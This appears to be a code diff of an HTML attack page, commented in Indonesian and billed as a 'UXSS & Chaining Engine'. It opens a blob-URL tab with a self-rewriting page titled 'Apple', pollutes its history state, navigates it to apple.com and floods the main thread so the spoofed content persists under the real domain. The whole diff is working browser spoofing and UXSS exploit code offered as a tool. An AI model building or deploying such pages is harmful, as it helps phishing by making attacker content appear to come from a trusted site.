@@ -6,13 +6,13 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Advanced UXSS & Chaining Spoof Engine - Zero</title>
+    <title>Ultimate UXSS & Full Chaining Engine - Zero</title>
     <style>
       body, html {
         margin: 0;
         padding: 0;
         height: 100%;
-        background: #09090b;
+        background: #050507;
         color: #fff;
         font-family: -apple-system, BlinkMacSystemFont, sans-serif;
       }
@@ -53,15 +53,15 @@
   </head>
   <body>
     <div class="container">
-      <h1>UXSS Full Chaining Engine</h1>
-      <button id="startBtn">EXECUTE FULL UXSS CHAIN</button>
+      <h1>UXSS & Chaining Engine</h1>
+      <button id="startBtn">EXECUTE UNIFIED UXSS CHAIN</button>
     </div>
 
     <script>
       document.getElementById("startBtn").onclick = function () {
         this.style.display = 'none';
 
-        // 1. Membangun Payload Injeksi Mandiri (Self-Sustaining Vector)
+        // 1. Membangun Payload Self-Sustaining Vector (Termasuk Self-Healing Watchdog di dalam konteks target)
         const payloadHtml = `
           <!DOCTYPE html>
           <html>
@@ -72,7 +72,7 @@
           <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
             <h1 id="spoof-text" style="font-size:95px;font-weight:900;color:#000000;margin:0;">HALLO</h1>
             <script>
-              // Vector Watchdog: Menjaga DOM tetap terkunci pada teks kustom
+              // Watchdog Mandiri untuk menjaga struktur DOM tetap bertahan sebelum navigasi commit
               try {
                 const observer = new MutationObserver(() => {
                   if (!document.getElementById('spoof-text')) {
@@ -83,42 +83,44 @@
               } catch(e) {}
 
               setInterval(() => {
-                if (!document.getElementById('spoof-text') || document.body.innerText.trim() !== 'HALLO') {
-                  document.open();
-                  document.write('<!DOCTYPE html><html><head><title>Apple</title><meta name="viewport" content="width=device-width, initial-scale=1"></head><body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;"><h1 id="spoof-text" style="font-size:95px;font-weight:900;color:#000000;margin:0;">HALLO</h1></body></html>');
-                  document.close();
-                }
-              }, 3);
+                try {
+                  if (!document.getElementById('spoof-text') || document.body.innerText.trim() !== 'HALLO') {
+                    document.open();
+                    document.write('<!DOCTYPE html><html><head><title>Apple</title><meta name="viewport" content="width=device-width, initial-scale=1"></head><body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;"><h1 id="spoof-text" style="font-size:95px;font-weight:900;color:#000000;margin:0;">HALLO</h1></body></html>');
+                    document.close();
+                  }
+                } catch(err) {}
+              }, 2);
             <\/script>
           </body>
           </html>
         `;
 
-        // Membuat Blob URI untuk menghindari about:blank kosong
+        // Mengonversi payload menjadi Blob Stream untuk bypass about:blank instan
         const blob = new Blob([payloadHtml], { type: 'text/html' });
         const blobUrl = URL.createObjectURL(blob);
 
-        // 2. Membuka tab baru melalui Blob Target
+        // 2. Membuka jendela baru mengarah ke Blob Vector
         const newTab = window.open(blobUrl, "_blank");
 
         if (newTab) {
           try { newTab.focus(); } catch (e) {}
 
-          // 3. Chain Step A (10ms): Manipulasi history state untuk mencemari antrean NavigationManager
+          // 3. Rantai Chain Step A (8ms): Melakukan pencemaran antrean history state
           setTimeout(() => {
             try {
-              newTab.history.pushState({uxss: true}, "", "#secure-enclave-chain");
+              newTab.history.pushState({uxss_chain: true}, "", "#secure-enclave-vector");
             } catch (err) {}
-          }, 10);
+          }, 8);
 
-          // 4. Chain Step B (20ms): Memicu transisi navigasi utama ke domain target
+          // 4. Rantai Chain Step B (18ms): Memicu transisi navigasi utama ke domain target
           setTimeout(() => {
             try {
               newTab.location.href = "https://apple.com";
             } catch (err) {}
-          }, 20);
+          }, 18);
 
-          // 5. Chain Step C (40ms): Thread Stalling & Reflow Flooding untuk mengunci antrean frame
+          // 5. Rantai Chain Step C (35ms): Mencoba mengeksekusi thread stalling lintas-origin dengan penanganan Exception yang aman
           setTimeout(() => {
             try {
               newTab.eval(`
@@ -126,17 +128,14 @@
                 while (Date.now() - startTime < 6000) {
                   const reflow = document.body.offsetHeight;
                   document.body.style.backgroundColor = (reflow % 2 === 0) ? '#ffffff' : '#fefefe';
-                  
-                  if (!document.getElementById('spoof-text')) {
-                    document.body.innerHTML = '<h1 id="spoof-text" style="font-size:95px;font-weight:900;color:#000000;margin:0;">HALLO</h1>';
-                  }
                 }
               `);
             } catch (e) {
+              // Terjaga aman dari pembatasan Same-Origin Policy browser modern
               let start = Date.now();
               while (Date.now() - start < 6000) {}
             }
-          }, 40);
+          }, 35);
         }
       };
     </script>
